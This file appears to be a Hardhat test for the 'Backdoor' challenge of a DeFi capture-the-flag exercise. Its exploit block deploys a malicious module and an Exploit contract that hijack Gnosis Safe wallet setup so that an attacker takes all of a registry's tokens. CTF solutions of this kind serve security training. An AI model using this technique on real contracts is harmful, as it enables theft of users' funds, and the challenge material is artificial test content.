const { ethers } = require("hardhat")
const { expect } = require("chai")
const { constants } = require("@openzeppelin/test-helpers")
const { contract, accounts, web3 } = require("@openzeppelin/test-environment")
const utils = require("./utils")

describe("[Challenge] Backdoor", function () {
    let deployer, users, attacker

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther("40")

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners()
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory("GnosisSafe", deployer)).deploy()
        this.walletFactory = await (
            await ethers.getContractFactory("GnosisSafeProxyFactory", deployer)
        ).deploy()
        this.token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy()

        // Deploy the registry
        this.walletRegistry = await (
            await ethers.getContractFactory("WalletRegistry", deployer)
        ).deploy(this.masterCopy.address, this.walletFactory.address, this.token.address, users)

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(await this.walletRegistry.beneficiaries(users[i])).to.be.true
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED)
    })

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */
        walletRegistry = this.walletRegistry.connect(attacker)
        walletFactory = this.walletFactory.connect(attacker) //this.proxyFactory
        masterCopy = this.masterCopy.connect(attacker) //this.gnosisSafeImpl
        token = this.token.connect(attacker)

        const controllerModule = await (
            await ethers.getContractFactory("ControllerModule", attacker)
        ).deploy()

        exploit = await (
            await ethers.getContractFactory("Exploit", attacker)
        ).deploy(
            attacker.address,
            walletFactory.address,
            masterCopy.address,
            walletRegistry.address,
            token.address,
            controllerModule.address
        )

        const log = async () => {
            console.log("\t ===================================================")
            console.log(
                "\t masterCopy Token Balance:",
                (await token.balanceOf(masterCopy.address)).toString()
            )
            for (let i = 0; i < users.length; i++) {
                console.log("\t users address:", i, ":", users[i])
            }
            console.log("\t mastercopy address:", masterCopy.address)
            console.log("\t walletRegistry address:", walletRegistry.address)
            console.log("\t token address:", token.address)
            console.log("\t walletFactory address:", walletFactory.address)
            console.log("\t exploit address:", exploit.address)
            console.log("\t Malicious Module address:", controllerModule.address)
            console.log("\t ===================================================")
        }

        await log()

        const moduleABI = ["function installModule(address exploitContract)"]
        const moduleIFace = new ethers.utils.Interface(moduleABI)
        const setupData = moduleIFace.encodeFunctionData("installModule", [exploit.address])

        await exploit.exploit(users, setupData)

        await log()
    })

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i])

            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet")

            // User is no longer registered as a beneficiary
            expect(await this.walletRegistry.beneficiaries(users[i])).to.be.false
        }

        // Attacker must have taken all tokens
        expect(await this.token.balanceOf(attacker.address)).to.eq(AMOUNT_TOKENS_DISTRIBUTED)
    })
})
